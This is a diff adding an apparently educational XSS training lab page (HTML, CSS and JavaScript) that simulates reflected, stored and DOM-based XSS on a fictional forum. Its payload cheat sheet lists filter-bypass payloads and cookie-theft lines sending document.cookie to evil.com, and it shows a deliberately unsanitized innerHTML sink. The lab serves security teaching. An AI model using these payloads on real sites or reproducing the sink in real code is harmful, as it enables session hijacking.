+            animation: xssFlashAnim 0.6s ease-out forwards;
+        }
+
+        @keyframes xssFlashAnim {
+            0%   { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        /* ─── Alert Dialog Simulation ─── */
+        .sim-alert {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.85);
+            background: #1a1a2e;
+            border: 1px solid rgba(100, 60, 130, 0.4);
+            border-radius: 6px;
+            padding: 0;
+            z-index: 600;
+            width: 320px;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.7), 0 0 30px rgba(147, 51, 234, 0.15);
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.2s, transform 0.2s;
+        }
+
+        .sim-alert.show {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+            pointer-events: all;
+        }
+
+        .sim-alert-titlebar {
+            background: rgba(20, 10, 30, 0.95);
+            padding: 8px 14px;
+            border-bottom: 1px solid rgba(100, 60, 130, 0.2);
+            border-radius: 6px 6px 0 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .sim-alert-browser-icon {
+            font-size: 0.75rem;
+        }
+
+        .sim-alert-origin {
+            font-family: 'Courier New', monospace;
+            font-size: 0.68rem;
+            color: var(--text-dim);
+            flex: 1;
+        }
+
+        .sim-alert-body {
+            padding: 20px 18px 16px;
+        }
+
+        .sim-alert-message {
+            font-family: 'Courier New', monospace;
+            font-size: 0.82rem;
+            color: var(--text-bright);
+            margin-bottom: 16px;
+            word-break: break-all;
+        }
+
+        .sim-alert-buttons {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .sim-alert-ok {
+            padding: 5px 20px;
+            background: rgba(147, 51, 234, 0.15);
+            border: 1px solid var(--border-mid);
+            border-radius: 4px;
+            color: var(--accent-light);
+            font-family: 'Courier New', monospace;
+            font-size: 0.75rem;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .sim-alert-ok:hover {
+            background: rgba(147, 51, 234, 0.28);
+        }
+
+        /* ─── Objective Complete Toast ─── */
+        .obj-toast {
+            position: fixed;
+            top: 70px;
+            right: 20px;
+            background: rgba(34, 197, 94, 0.12);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            border-radius: 6px;
+            padding: 10px 16px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.76rem;
+            color: var(--green);
+            z-index: 700;
+            transform: translateX(120%);
+            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            max-width: 280px;
+        }
+
+        .obj-toast.show {
+            transform: translateX(0);
+        }
+
+        .obj-toast-title {
+            font-size: 0.65rem;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            color: rgba(34, 197, 94, 0.6);
+            margin-bottom: 2px;
+        }
+
+        /* ─── Responsive ─── */
+        @media (max-width: 900px) {
+            .lab-layout {
+                grid-template-columns: 1fr;
+                grid-template-rows: 1fr auto auto;
+                height: auto;
+            }
+
+            .right-panel {
+                height: 400px;
+                border-top: 1px solid var(--border-dim);
+            }
+
+            .left-col {
+                border-right: none;
+                min-height: 500px;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .lab-header { padding: 12px 16px; }
+            .forum-content { padding: 12px 14px 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ─── Header ─── -->
+    <header class="lab-header">
+        <div class="header-left">
+            <a href="../index.html" class="back-btn">← EHE</a>
+            <div class="header-title-group">
+                <div class="lab-badge">EHE Lab 15 // Web Application Attacks</div>
+                <div class="lab-title">XSS Payload Crafting &amp; Exploitation</div>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="obj-counter">
+                <span class="obj-label">Objectives</span>
+                <span class="obj-value"><span id="objDone">0</span> / 8</span>
+            </div>
+            <div class="score-display">
+                <span class="score-label">Score</span>
+                <span class="score-value" id="scoreDisplay">100</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- ─── Ethical Warning ─── -->
+    <div class="warning-banner">
+        <span class="warning-icon">&#9888;</span>
+        <div class="warning-text">
+            <strong>AUTHORIZED EDUCATIONAL USE ONLY.</strong>
+            This lab simulates XSS vulnerabilities in a controlled environment. All payloads are
+            pattern-matched and their effects are simulated — no real JavaScript is executed from
+            user input. Apply these techniques exclusively on systems you own or have written
+            permission to test. Unauthorized use is illegal and unethical.
+        </div>
+    </div>
+
+    <!-- ─── Main Layout ─── -->
+    <div class="lab-layout">
+
+        <!-- ═══════ Left Column ═══════ -->
+        <div class="left-col">
+
+            <!-- Challenge Tabs -->
+            <div class="challenge-tabs">
+                <button class="tab-btn active" id="tab1" onclick="switchChallenge(1)">
+                    <span class="tab-check" id="check1"></span>Ch. 1: Reflected XSS
+                </button>
+                <button class="tab-btn" id="tab2" onclick="switchChallenge(2)">
+                    <span class="tab-check" id="check2"></span>Ch. 2: Stored XSS
+                </button>
+                <button class="tab-btn" id="tab3" onclick="switchChallenge(3)">
+                    <span class="tab-check" id="check3"></span>Ch. 3: DOM-Based XSS
+                </button>
+            </div>
+
+            <!-- Forum Simulation Area -->
+            <div class="forum-area" id="forumArea">
+
+                <!-- ── Challenge 1: Reflected XSS ── -->
+                <div id="challenge1">
+                    <!-- Fake browser chrome -->
+                    <div class="browser-chrome">
+                        <div class="browser-dots">
+                            <div class="browser-dot red"></div>
+                            <div class="browser-dot amber"></div>
+                            <div class="browser-dot green"></div>
+                        </div>
+                        <div class="browser-url" id="urlBar1">http://novacorp-forum.local/search?q=</div>
+                    </div>
+
+                    <!-- Forum header -->
+                    <div class="forum-header">
+                        <div class="forum-logo">Nova<span>Corp</span> Community</div>
+                        <div class="forum-nav">
+                            <span class="forum-nav-item active">Search</span>
+                            <span class="forum-nav-item">Forum</span>
+                            <span class="forum-nav-item">Profile</span>
+                        </div>
+                    </div>
+
+                    <!-- Forum content -->
+                    <div class="forum-content">
+                        <div class="search-section">
+                            <div class="search-bar-wrap">
+                                <input
+                                    type="text"
+                                    id="searchInput"
+                                    class="forum-search-input"
+                                    placeholder="Search forum posts..."
+                                    autocomplete="off"
+                                    spellcheck="false"
+                                    maxlength="200"
+                                    oninput="updateUrlBar(this.value)"
+                                />
+                                <button class="forum-btn" onclick="doSearch()">Search</button>
+                            </div>
+
+                            <!-- Search results — reflected output rendered here -->
+                            <div class="search-results" id="searchResults">
+                                <div class="search-results-heading" id="searchHeading" style="color: var(--text-faint); font-size: 0.75rem;">
+                                    Enter a search term above.
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Existing posts for context -->
+                        <div class="forum-post-card">
+                            <div class="post-meta">
+                                <div class="post-avatar">JT</div>
+                                <span class="post-author">j.torres</span>
+                                <span class="post-time">2h ago</span>
+                            </div>
+                            <div class="post-title">NovaCorp Q3 security digest — internal circulation</div>
+                            <div class="post-body">Reminder that all employees must complete the mandatory phishing awareness training by end of month. Session IDs: PHPSESSID=d41f8a; user=admin.</div>
+                        </div>
+
+                        <div class="forum-post-card">
+                            <div class="post-meta">
+                                <div class="post-avatar">RK</div>
+                                <span class="post-author">r.khan</span>
+                                <span class="post-time">5h ago</span>
+                            </div>
+                            <div class="post-title">Upcoming server maintenance — 2026-03-01 02:00 UTC</div>
+                            <div class="post-body">The forum and intranet will be offline for approximately 4 hours. Plan accordingly. Auth tokens will be invalidated post-maintenance.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── Challenge 2: Stored XSS ── -->
+                <div id="challenge2" style="display: none;">
+                    <div class="browser-chrome">
+                        <div class="browser-dots">
+                            <div class="browser-dot red"></div>
+                            <div class="browser-dot amber"></div>
+                            <div class="browser-dot green"></div>
+                        </div>
+                        <div class="browser-url">http://novacorp-forum.local/thread?id=1042</div>
+                    </div>
+
+                    <div class="forum-header">
+                        <div class="forum-logo">Nova<span>Corp</span> Community</div>
+                        <div class="forum-nav">
+                            <span class="forum-nav-item">Search</span>
+                            <span class="forum-nav-item active">Forum</span>
+                            <span class="forum-nav-item">Profile</span>
+                        </div>
+                    </div>
+
+                    <div class="forum-content">
+                        <!-- Original post -->
+                        <div class="forum-post-card">
+                            <div class="post-meta">
+                                <div class="post-avatar">AD</div>
+                                <span class="post-author">a.davison</span>
+                                <span class="post-time">1d ago</span>
+                            </div>
+                            <div class="post-title">Favorite security tools for web assessments?</div>
+                            <div class="post-body">
+                                Curious what the team is using for web app security testing these days.
+                                Particularly interested in anything that helps identify injection points
+                                or session management flaws. Drop your picks below.
+                            </div>
+                        </div>
+
+                        <!-- Comment section -->
+                        <div class="comment-section">
+                            <div class="section-divider">Replies (2)</div>
+
+                            <!-- Seed comments -->
+                            <div class="comment-list" id="commentList">
+                                <div class="comment-item">
+                                    <div class="comment-header">
+                                        <div class="post-avatar" style="width:22px;height:22px;font-size:0.58rem;">MP</div>
+                                        <span class="comment-author">m.petrova</span>
+                                        <span class="comment-time">22h ago</span>
+                                    </div>
+                                    <div class="comment-body">Burp Suite Pro is indispensable. The scanner catches a lot of the obvious stuff automatically.</div>
+                                </div>
+                                <div class="comment-item">
+                                    <div class="comment-header">
+                                        <div class="post-avatar" style="width:22px;height:22px;font-size:0.58rem;">LW</div>
+                                        <span class="comment-author">l.warren</span>
+                                        <span class="comment-time">18h ago</span>
+                                    </div>
+                                    <div class="comment-body">OWASP ZAP for anything open source. Pairs well with manual testing using browser dev tools.</div>
+                                </div>
+                            </div>
+
+                            <!-- Comment submission form -->
+                            <div class="comment-form" style="margin-top: 14px;">
+                                <div class="section-divider" style="margin-bottom: 10px;">Add a Reply</div>
+                                <div class="comment-form-row">
+                                    <div class="form-field">
+                                        <label class="form-label" for="commentName">Display Name</label>
+                                        <input
+                                            type="text"
+                                            id="commentName"
+                                            class="forum-input"
+                                            placeholder="Your name"
+                                            maxlength="80"
+                                            autocomplete="off"
+                                            spellcheck="false"
+                                        />
+                                    </div>
+                                </div>
+                                <div class="form-field" style="margin-bottom: 0;">
+                                    <label class="form-label" for="commentBody">Comment</label>
+                                    <textarea
+                                        id="commentBody"
+                                        class="forum-textarea"
+                                        placeholder="Write a comment... (try injecting a payload here)"
+                                        maxlength="400"
+                                        spellcheck="false"
+                                    ></textarea>
+                                </div>
+                                <button class="submit-btn" onclick="submitComment()">Post Reply</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ── Challenge 3: DOM-Based XSS ── -->
+                <div id="challenge3" style="display: none;">
+                    <div class="browser-chrome">
+                        <div class="browser-dots">
+                            <div class="browser-dot red"></div>
+                            <div class="browser-dot amber"></div>
+                            <div class="browser-dot green"></div>
+                        </div>
+                        <div class="browser-url" id="urlBar3">http://novacorp-forum.local/profile#</div>
+                    </div>
+
+                    <div class="forum-header">
+                        <div class="forum-logo">Nova<span>Corp</span> Community</div>
+                        <div class="forum-nav">
+                            <span class="forum-nav-item">Search</span>
+                            <span class="forum-nav-item">Forum</span>
+                            <span class="forum-nav-item active">Profile</span>
+                        </div>
+                    </div>
+
+                    <div class="forum-content profile-page">
+                        <!-- Profile greeting — DOM injection target -->
+                        <div class="profile-card">
+                            <div class="profile-greeting" id="profileGreeting">
+                                Welcome, <span class="profile-greeting-render" id="greetingRender">guest</span>
+                            </div>
+                            <div class="profile-info">
+                                Member since: 2024-01-15 &nbsp;|&nbsp;
+                                Role: Contributor &nbsp;|&nbsp;
+                                Posts: 42
+                            </div>
+                        </div>
+
+                        <!-- DOM XSS explanation -->
+                        <div class="dom-url-sim">
+                            <div class="dom-label">Simulate URL Fragment (#hash)</div>
+                            <div class="dom-url-bar">
+                                <span class="dom-url-prefix">...novacorp-forum.local/profile</span>
+                                <input
+                                    type="text"
+                                    id="domFragmentInput"
+                                    class="dom-fragment-input"
+                                    placeholder="#YourName"
+                                    autocomplete="off"
+                                    spellcheck="false"
+                                    maxlength="200"
+                                    oninput="updateDomUrl(this.value)"
+                                />
+                                <button class="dom-go-btn" onclick="applyDomFragment()">Navigate</button>
+                            </div>
+                            <div class="dom-code-note">
+                                Vulnerable JS on this page:<br>
+                                <span class="dom-code-snippet">document.getElementById('greetingRender').innerHTML = location.hash.substring(1);</span><br>
+                                No sanitization. The fragment value is written directly to the DOM.
+                            </div>
+                        </div>
+
+                        <!-- Additional profile content for realism -->
+                        <div class="forum-post-card">
+                            <div class="post-meta">
+                                <div class="post-avatar">??</div>
+                                <span class="post-author">Profile Activity</span>
+                                <span class="post-time">recent</span>
+                            </div>
+                            <div class="post-body">
+                                This profile page reads the <code style="color: var(--source-amber); font-size: 0.8em;">#name</code>
+                                fragment from the URL and injects it into the DOM without sanitization.
+                                Try setting the fragment to an XSS payload to exploit this DOM-based vulnerability.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div><!-- /forum-area -->
+
+            <!-- ─── Browser Console Panel ─── -->
+            <div class="console-panel">
+                <div class="console-toolbar">
+                    <span class="console-label">Browser Console</span>
+                    <button class="console-clear-btn" onclick="clearConsole()">clear()</button>
+                </div>
+                <div class="console-output" id="consoleOutput">
+                    <!-- Lines injected by JS -->
+                </div>
+            </div>
+
+        </div><!-- /left-col -->
+
+
+        <!-- ═══════ Right Panel ═══════ -->
+        <div class="right-panel">
+
+            <!-- Panel tabs -->
+            <div class="panel-tabs">
+                <button class="panel-tab active" onclick="switchPanel('source')">HTML Source</button>
+                <button class="panel-tab" onclick="switchPanel('objectives')">Objectives</button>
+            </div>
+
+            <!-- HTML Source View -->
+            <div class="panel-view active" id="panelSource">
+                <div class="source-panel" id="sourcePanel">
+                    <!-- Populated by JS based on active challenge -->
+                </div>
+            </div>
+
+            <!-- Objectives & Cheat Sheet View -->
+            <div class="panel-view" id="panelObjectives" style="overflow-y: auto;">
+                <div class="objectives-list">
+
+                    <!-- Cheat Sheet (collapsible) -->
+                    <div style="margin-bottom: 14px;">
+                        <button class="cheatsheet-toggle" id="cheatsheetToggle" onclick="toggleCheatsheet()">
+                            XSS Payload Reference
+                            <span class="cheatsheet-arrow">&#9660;</span>
+                        </button>
+                        <div class="cheatsheet-body" id="cheatsheetBody">
+                            <div class="payload-category">
+                                <div class="payload-cat-label">Basic Script Tags</div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+                                    <div class="payload-why">Classic payload. Script tags execute immediately when parsed by the browser. Most modern filters block this.</div>
+                                </div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;script&gt;document.cookie&lt;/script&gt;</code>
+                                    <div class="payload-why">Attempts to read session cookies. Shows what data an attacker could steal.</div>
+                                </div>
+                            </div>
+                            <div class="payload-category">
+                                <div class="payload-cat-label">Event Handler Payloads</div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;img src=x onerror=alert('XSS')&gt;</code>
+                                    <div class="payload-why">Bypasses script-tag filters. The broken image triggers onerror immediately — no user interaction needed.</div>
+                                </div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;svg onload=alert('XSS')&gt;</code>
+                                    <div class="payload-why">SVG elements support JS event handlers. onload fires when the SVG renders — no src attribute required.</div>
+                                </div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;body onload=alert('XSS')&gt;</code>
+                                    <div class="payload-why">Works when injected early in a page. Fires on document load.</div>
+                                </div>
+                            </div>
+                            <div class="payload-category">
+                                <div class="payload-cat-label">Cookie Theft</div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)"&gt;</code>
+                                    <div class="payload-why">Exfiltrates cookies to an attacker-controlled server via a GET request. The Fetch API makes it silent.</div>
+                                </div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;script&gt;new Image().src='//evil.com/?c='+document.cookie&lt;/script&gt;</code>
+                                    <div class="payload-why">Older cookie-theft technique using a hidden image request. Bypasses same-origin policy for GET requests.</div>
+                                </div>
+                            </div>
+                            <div class="payload-category">
+                                <div class="payload-cat-label">Encoded / Filter Bypass</div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;</code>
+                                    <div class="payload-why">Case variation bypasses case-sensitive keyword filters that only block lowercase 'script'.</div>
+                                </div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&#x3C;img src=x onerror=&#x61;lert&#x28;1&#x29;&gt;</code>
+                                    <div class="payload-why">HTML entity encoding. Browsers decode entities before parsing, so filters that check raw strings fail.</div>
+                                </div>
+                                <div class="payload-entry">
+                                    <code class="payload-code" onclick="copyPayload(this)">&lt;details open ontoggle=alert('XSS')&gt;</code>
+                                    <div class="payload-why">HTML5 element with event handler. Fires when the details element auto-opens. Often overlooked by filters.</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Objective list -->
+                    <div class="obj-section-title">Challenge 1: Reflected XSS</div>
+                    <div class="objective-item" id="obj1">
+                        <div class="obj-checkbox"><span class="obj-check-icon">&#10003;</span></div>
+                        <div class="obj-text">Find the reflected XSS injection point in the search page</div>
+                    </div>
+                    <div class="objective-item" id="obj2">
+                        <div class="obj-checkbox"><span class="obj-check-icon">&#10003;</span></div>
+                        <div class="obj-text">Trigger a reflected XSS alert using a &lt;script&gt; tag payload</div>
+                    </div>
+                    <div class="objective-item" id="obj3">
+                        <div class="obj-checkbox"><span class="obj-check-icon">&#10003;</span></div>
+                        <div class="obj-text">Craft and trigger an event-handler-based payload (onerror / onload)</div>
+                    </div>
+
+                    <div class="obj-section-title">Challenge 2: Stored XSS</div>
+                    <div class="objective-item" id="obj4">
+                        <div class="obj-checkbox"><span class="obj-check-icon">&#10003;</span></div>
+                        <div class="obj-text">Submit a stored XSS payload in the comment field</div>
+                    </div>
+                    <div class="objective-item" id="obj5">
+                        <div class="obj-checkbox"><span class="obj-check-icon">&#10003;</span></div>
+                        <div class="obj-text">Demonstrate cookie theft via a stored XSS payload</div>
+                    </div>
+
+                    <div class="obj-section-title">Challenge 3: DOM-Based XSS</div>
+                    <div class="objective-item" id="obj6">
+                        <div class="obj-checkbox"><span class="obj-check-icon">&#10003;</span></div>
+                        <div class="obj-text">Identify the DOM-based XSS vulnerability in the profile page</div>
+                    </div>
+                    <div class="objective-item" id="obj7">
+                        <div class="obj-checkbox"><span class="obj-check-icon">&#10003;</span></div>
+                        <div class="obj-text">Trigger DOM-based XSS by manipulating the URL fragment</div>
+                    </div>
+                    <div class="objective-item" id="obj8">
+                        <div class="obj-checkbox"><span class="obj-check-icon">&#10003;</span></div>
+                        <div class="obj-text">Use an encoded or obfuscated payload successfully</div>
+                    </div>
+
+                </div>
+
+                <!-- Hint section -->
+                <div class="hint-section">
+                    <button class="hint-btn" onclick="showHint()">
+                        Request Hint &nbsp;&mdash;&nbsp; <span style="color: var(--red); font-size: 0.68em;">&minus;5 pts</span>
+                    </button>
+                    <div class="hint-text" id="hintText"></div>
+                </div>
+
+                <!-- Completion -->
+                <div class="completion-section">
+                    <button class="completion-btn" id="completionBtn" onclick="completeLab()">
+                        Mark Lab Complete
+                    </button>
+                    <div class="completion-note" id="completionNote">Complete 6 of 8 objectives to unlock</div>
+                </div>
+            </div><!-- /panelObjectives -->
+
+        </div><!-- /right-panel -->
+
+    </div><!-- /lab-layout -->
+
+    <!-- XSS flash effect overlay -->
+    <div class="xss-flash" id="xssFlash"></div>
+
+    <!-- Simulated alert dialog -->
+    <div class="sim-alert" id="simAlert">
+        <div class="sim-alert-titlebar">
+            <span class="sim-alert-browser-icon">&#128506;</span>
+            <span class="sim-alert-origin">novacorp-forum.local says</span>
+        </div>
+        <div class="sim-alert-body">
+            <div class="sim-alert-message" id="simAlertMsg"></div>
+            <div class="sim-alert-buttons">
+                <button class="sim-alert-ok" onclick="closeSimAlert()">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Objective complete toast -->
+    <div class="obj-toast" id="objToast">
+        <div class="obj-toast-title">Objective Complete</div>
+        <div id="objToastMsg"></div>
+    </div>
+
+    <!-- FluxCapacitor: floating house navigation -->
+    <script src="../../../../components/FluxCapacitor.js"></script>
+
+    <script>
+    'use strict';
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // LAB STATE
+    // Tracks score, objectives, active challenge, and hint usage.
+    // All XSS detection is purely string-pattern-based — no eval, no innerHTML
+    // with untrusted dynamic content injected as live script. Payloads are
+    // matched and their *effects* are simulated in the console and UI.
+    // ─────────────────────────────────────────────────────────────────────────
+
+    const state = {
+        score: 100,
+        objectives: {
+            obj1: false, // reflected injection point found
+            obj2: false, // script tag alert triggered
+            obj3: false, // event handler payload triggered
+            obj4: false, // stored XSS submitted
+            obj5: false, // cookie theft payload stored
+            obj6: false, // DOM XSS vulnerability identified
+            obj7: false, // DOM XSS triggered via fragment
+            obj8: false  // encoded/obfuscated payload triggered
+        },
+        hintsUsed: 0,
+        activeChallenge: 1,
+        activePanel: 'source',
+        searchCount: 0,       // how many searches performed (for obj1)
+        ch1AlertCount: 0,     // how many XSS alerts triggered in ch1
+        storedComments: [],   // persisted comment list
+        simAlertQueue: [],    // queued alert dialogs
+        simAlertOpen: false
+    };
+
+    // Simulated cookie values exposed on the forum
+    const SIMULATED_COOKIES = 'PHPSESSID=d41f8a7bc9e3; user=admin; auth_token=eyJhbGciOiJIUzI1NiJ9';
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // XSS PATTERN DETECTION
+    // Returns an object describing what type of XSS payload was found,
+    // if any. Pure string matching — no execution of user content.
+    // ─────────────────────────────────────────────────────────────────────────
+
+    /**
+     * Analyze a string for XSS patterns.
+     * @param {string} input - Raw user input string
+     * @returns {{ isXss: boolean, type: string, hasCookieTheft: boolean,
+     *             hasAlert: boolean, isEncoded: boolean, isEventHandler: boolean,
+     *             isScript: boolean, isSvg: boolean, alertMsg: string }}
+     */
+    function detectXSS(input) {
+        const s = input.toLowerCase();
+        const result = {
+            isXss: false,
+            type: 'none',
+            hasCookieTheft: false,
+            hasAlert: false,
+            isEncoded: false,
+            isEventHandler: false,
+            isScript: false,
+            isSvg: false,
+            isDom: false,
+            alertMsg: ''
+        };
+
+        // Cookie theft patterns
+        if (
+            s.includes('document.cookie') ||
+            s.includes('/steal') ||
+            s.includes('evil.com') ||
+            (s.includes('fetch(') && s.includes('cookie'))
+        ) {
+            result.hasCookieTheft = true;
+        }
+
+        // Alert detection (extract message if present)
+        const alertMatch = input.match(/alert\s*\(\s*['"`]?([^'"`\)]{0,60})['"`]?\s*\)/i);
+        if (alertMatch) {
+            result.hasAlert = true;
+            result.alertMsg = alertMatch[1] || 'XSS';
+        } else if (s.includes('alert(') || s.includes('alert (')) {
+            result.hasAlert = true;
+            result.alertMsg = 'XSS';
+        }
+
+        // Encoded/obfuscated patterns
+        if (
+            s.includes('&#x') ||
+            s.includes('%3c') ||
+            s.includes('%3e') ||
+            s.includes('&#') ||
+            /scr\s*ipt/i.test(input) ||       // broken script tag
+            /on\w+=\s*&#/i.test(input) ||     // encoded handler value
+            /[A-Z]/.test(input.match(/<[a-zA-Z]+/)?.[0] || '') // mixed case tag
+        ) {
+            result.isEncoded = true;
+        }
+
+        // Script tag
+        if (/<\s*s\s*c\s*r\s*i\s*p\s*t[\s>]/i.test(input) || s.includes('<script')) {
+            result.isScript = true;
+            result.isXss = true;
+            result.type = 'script-tag';
+        }
+
+        // SVG onload
+        if (s.includes('<svg') && (s.includes('onload') || s.includes('onerror'))) {
+            result.isSvg = true;
+            result.isEventHandler = true;
+            result.isXss = true;
+            result.type = 'svg-onload';
+        }
+
+        // Event handler tags (img, body, details, input, etc.)
+        if (
+            /<\s*(img|body|input|details|video|audio|iframe|object|embed|form|select|textarea|table|div|span|p|a|button|marquee)\s[^>]*(on\w+\s*=)/i.test(input)
+        ) {
+            result.isEventHandler = true;
+            result.isXss = true;
+            result.type = result.type === 'none' ? 'event-handler' : result.type;
+        }
+
+        // javascript: URI scheme
+        if (s.includes('javascript:')) {
+            result.isXss = true;
+            result.isEventHandler = true;
+            result.type = 'javascript-uri';
+        }
+
+        // HTML entity encoded script / handler (catches &#x3C;img...&#x3E;)
+        if ((s.includes('&#x') || s.includes('&#')) && (s.includes('alert') || s.includes('onerror') || s.includes('script'))) {
+            result.isXss = true;
+            result.isEncoded = true;
+            result.type = result.type === 'none' ? 'encoded' : result.type;
+            if (!result.hasAlert) {
+                result.hasAlert = true;
+                result.alertMsg = 'XSS';
+            }
+        }
+
+        // Mixed-case bypass (e.g., <ScRiPt>)
+        if (/<[Ss][Cc][Rr][Ii][Pp][Tt]/i.test(input) && input.match(/<[Ss][Cc][Rr][Ii][Pp][Tt]/)?.[0] !== input.toLowerCase().match(/<script/)?.[0]) {
+            result.isEncoded = true;
+            result.isXss = true;
+            result.type = 'mixed-case';
+        }
+
+        return result;
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // CONSOLE OUTPUT
+    // ─────────────────────────────────────────────────────────────────────────
+
+    /**
+     * Append a line to the browser console panel.
+     * @param {string} text - Message to display
+     * @param {'info'|'alert'|'xss'|'success'|'cookie'|'network'} type - Visual style
+     */
+    function consoleLog(text, type = 'info') {
+        const output = document.getElementById('consoleOutput');
+        const line = document.createElement('div');
+        line.className = 'console-line type-' + type;
+
+        // Prefix symbols by type
+        const prefixMap = {
+            info:    '>',
+            alert:   '[ALERT]',
+            xss:     '[XSS]',
+            success: '[OK]',
+            cookie:  '[COOKIE]',
+            network: '[NET]'
+        };
+
+        const prefix = document.createElement('span');
+        prefix.className = 'console-prefix';
+        // Use textContent to avoid any injection from prefix strings (they're static)
+        prefix.textContent = prefixMap[type] || '>';
+
+        const msg = document.createElement('span');
+        msg.className = 'console-text';
+        // textContent only — never innerHTML with user data
+        msg.textContent = text;
+
+        line.appendChild(prefix);
+        line.appendChild(msg);
+        output.appendChild(line);
+        // Auto-scroll to newest entry
+        output.scrollTop = output.scrollHeight;
+    }
+
+    function clearConsole() {
+        document.getElementById('consoleOutput').innerHTML = '';
+        consoleLog('Console cleared.', 'info');
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // SIMULATED ALERT DIALOG
+    // Shows a faux browser alert dialog — never calls window.alert().
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function showSimAlert(message) {
+        if (state.simAlertOpen) {
+            // Queue it
+            state.simAlertQueue.push(message);
+            return;
+        }
+        state.simAlertOpen = true;
+        const el = document.getElementById('simAlert');
+        const msgEl = document.getElementById('simAlertMsg');
+        // textContent prevents any injection in the alert dialog itself
+        msgEl.textContent = message;
+        el.classList.add('show');
+    }
+
+    function closeSimAlert() {
+        const el = document.getElementById('simAlert');
+        el.classList.remove('show');
+        state.simAlertOpen = false;
+        // Process queue
+        if (state.simAlertQueue.length > 0) {
+            setTimeout(() => showSimAlert(state.simAlertQueue.shift()), 200);
+        }
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // XSS FLASH EFFECT
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function triggerXssFlash() {
+        const el = document.getElementById('xssFlash');
+        el.classList.remove('active');
+        // Force reflow to restart animation
+        void el.offsetWidth;
+        el.classList.add('active');
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // OBJECTIVE MANAGEMENT
+    // ─────────────────────────────────────────────────────────────────────────
+
+    /**
+     * Mark an objective as complete, update score display, show toast.
+     * @param {string} objId - Objective key (e.g. 'obj1')
+     * @param {string} toastMsg - Short message for the toast notification
+     */
+    function completeObjective(objId, toastMsg) {
+        if (state.objectives[objId]) return; // already complete
+        state.objectives[objId] = true;
+
+        // Update objective item UI
+        const item = document.getElementById(objId);
+        if (item) item.classList.add('completed');
+
+        // Count completed
+        const done = Object.values(state.objectives).filter(Boolean).length;
+        document.getElementById('objDone').textContent = done;
+
+        // Check if tab should be marked complete
+        updateTabCompletionState();
+
+        // Check completion button unlock (6 of 8)
+        if (done >= 6) {
+            const btn = document.getElementById('completionBtn');
+            btn.classList.add('ready');
+            document.getElementById('completionNote').textContent = 'Score: ' + state.score + ' pts';
+        }
+
+        // Show toast
+        showObjToast(toastMsg);
+
+        consoleLog('[Objective] ' + toastMsg, 'success');
+    }
+
+    function updateTabCompletionState() {
+        // Ch1: obj1, obj2, obj3
+        const ch1Done = state.objectives.obj1 && state.objectives.obj2 && state.objectives.obj3;
+        // Ch2: obj4, obj5
+        const ch2Done = state.objectives.obj4 && state.objectives.obj5;
+        // Ch3: obj6, obj7, obj8
+        const ch3Done = state.objectives.obj6 && state.objectives.obj7 && state.objectives.obj8;
+
+        if (ch1Done) {
+            document.getElementById('tab1').classList.add('challenge-complete');
+            document.getElementById('check1').style.background = 'var(--green)';
+        }
+        if (ch2Done) {
+            document.getElementById('tab2').classList.add('challenge-complete');
+            document.getElementById('check2').style.background = 'var(--green)';
+        }
+        if (ch3Done) {
+            document.getElementById('tab3').classList.add('challenge-complete');
+            document.getElementById('check3').style.background = 'var(--green)';
+        }
+    }
+
+    function showObjToast(msg) {
+        const toast = document.getElementById('objToast');
+        const msgEl = document.getElementById('objToastMsg');
+        msgEl.textContent = msg;
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // SCORE
+    // ─────────────────────────────────────────────────────────────────────────
+
+    function deductPoints(pts) {
+        state.score = Math.max(0, state.score - pts);
+        const el = document.getElementById('scoreDisplay');
+        el.textContent = state.score;
+        el.classList.remove('penalty');
+        void el.offsetWidth;
+        el.classList.add('penalty');
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // CHALLENGE 1: REFLECTED XSS
+    // ─────────────────────────────────────────────────────────────────────────
+
